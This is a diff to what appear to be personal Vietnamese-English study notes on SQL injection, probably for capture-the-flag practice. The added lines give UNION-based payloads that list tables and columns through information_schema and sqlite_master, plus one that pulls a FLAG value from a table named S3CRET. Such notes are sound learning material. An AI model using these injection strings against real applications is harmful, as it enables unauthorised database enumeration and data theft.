@@ -88,6 +88,7 @@ cột, sau đó truy vấn như bình thường, truy vấn cho csdl sẽ chiế
 
 
 Listing the contents of the database
+MySQL/PostgreSQL
 to list the tables in the database: ' UNION SELECT * FROM information_schema.tables / ' UNION SELECT table_name, NULL FROM information_schema.tables--
 to list the columns in individual tables: ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
@@ -103,6 +104,15 @@ graph TD
     E --> H[Tìm được tên cột];
     G --> D;
     H --> F;
+SQLite 
+-- Liệt kê tables
+SELECT name FROM sqlite_master WHERE type='table'
+-- Liệt kê columns (cách 1)
+SELECT sql FROM sqlite_master WHERE type='table' AND name='users'
+for example: ' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'--
+Hoặc đơn giản hơn:
+' UNION SELECT 1, name, type, 4 FROM sqlite_master--
+sau đó: ' UNION SELECT 1, FLAG, 'Flag Found', 4 FROM S3CRET--
 
 BLIND SQLi
 SQLi mù, chỉ hiện những thứ như bt hoặc không, không hiện lỗi, cần đoán như kiểu có cái này hoặc không
